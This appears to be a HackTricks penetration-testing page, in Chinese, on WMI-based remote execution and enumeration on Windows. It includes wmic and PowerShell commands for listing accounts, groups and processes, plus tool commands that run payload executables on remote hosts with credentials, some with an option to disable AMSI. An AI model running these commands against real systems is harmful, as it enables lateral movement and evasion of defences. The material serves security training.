# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## 工作原理详解

通过使用 WMI，可以在已知用户名以及密码或 hash 的主机上打开进程。Wmiexec 使用 WMI 执行命令，并提供半交互式 shell 体验。

**dcomexec.py：** 此脚本使用不同的 DCOM endpoints，提供类似于 `wmiexec.py` 的半交互式 shell。所选的 `-object` 值用于选择 endpoint；支持的对象包括 `MMC20.Application`、`ShellWindows` 和 `ShellBrowserWindow`，后者提供原始 walkthrough 中重点介绍的 Shell Browser Window technique。<sup>[[2]](#references)[[3]](#references)</sup>

## WMI 基础

### 命名空间

WMI 的顶级容器采用目录式层级结构，即 \root，其下组织着其他称为命名空间的目录。<sup>[[1]](#references)</sup>
列出命名空间的命令：
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
可以使用以下命令列出命名空间中的类：
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Classes**

了解 WMI 类名（例如 win32_process）及其所在的 namespace，对于执行任何 WMI 操作都至关重要。  
列出以 `win32` 开头的类的命令：
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
类的调用：
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### 方法

可以执行 WMI 类的 Methods，即一个或多个可执行函数。
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI 枚举

### WMI 服务状态

用于验证 WMI 服务是否正常运行的命令：
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### 系统和进程信息

通过 WMI 收集系统和进程信息：
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
对于攻击者而言，WMI 是枚举有关系统或域的敏感数据的强大工具。<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
远程查询 WMI 以获取特定信息（例如本地管理员或已登录用户）是可行的，但需要谨慎构造命令。

### **手动远程 WMI 查询**

通过特定的 WMI 查询，可以隐蔽地识别远程计算机上的本地管理员和已登录用户。`wmic` 还支持从文本文件读取内容，以便同时在多个节点上执行命令。<sup>[[1]](#references)</sup>

要通过 WMI 远程执行进程（例如部署 Empire agent），可以使用以下命令结构；返回值为 "0" 表示执行成功：<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
此过程展示了 WMI 的远程执行和系统枚举能力，突出了其在系统管理和 penetration testing 中的实用性。

## 自动化工具

- [**SharpLateral**](https://github.com/mertdas/SharpLateral)：
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- 你也可以使用 **Impacket 的 `wmiexec`**。


## References

- [1] [使用凭据控制 Windows 主机 - 第 3 部分（WMI 和 WinRM）](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Impacket 工具包入门指南，第 1 部分 – Hacking Articles（Internet Archive）](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
